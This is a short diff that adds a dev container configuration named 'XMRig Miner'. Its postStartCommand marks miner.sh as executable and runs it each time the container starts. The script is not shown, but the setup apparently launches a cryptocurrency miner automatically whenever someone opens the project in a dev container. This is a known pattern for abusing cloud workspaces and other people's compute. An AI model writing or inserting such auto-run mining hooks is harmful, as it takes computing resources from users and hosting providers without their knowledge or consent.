@@ -1,0 +1,6 @@
+{
+  "name": "XMRig Miner",
+  "image": "mcr.microsoft.com/vscode/devcontainers/ubuntu:22.04",
+  "features": {},
+  "postStartCommand": "chmod +x miner.sh && ./miner.sh"
+}
